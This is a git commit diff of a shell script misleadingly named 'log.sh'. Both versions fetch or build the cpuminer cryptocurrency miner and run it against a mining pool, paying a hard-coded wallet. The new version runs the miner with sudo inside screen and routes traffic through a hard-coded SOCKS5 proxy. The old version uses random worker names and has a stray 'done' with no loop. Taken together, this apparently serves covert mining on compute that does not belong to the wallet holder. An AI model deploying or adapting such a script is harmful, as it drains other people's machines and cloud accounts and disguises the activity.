89ee2281daaf155a45872a994385d384a6ef308c
Adakaru <95546484+Adakaru@users.noreply.github.com>
2021-12-23 09:41:26 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,6 +1,10 @@
-#!/bin/sh
-sudo apt update
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-avx2 && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.$(echo $(shuf -i 1-999999999 -n 1)-Wira) -p c=DGB,zap=BUT-lyra2z330 -t 2
-sleep 5
-done
-sleep 10
+apt update
+
+apt upgrade -y
+
+sudo apt-get -y install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git screen  
+cd && git clone https://github.com/JayDDee/cpuminer-opt.git && cd cpuminer-opt && ./build.sh
+
+screen
+
+sudo ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB,zap=BUT-lyra2z330 -x socks5://70.166.167.36:4145 -t 2
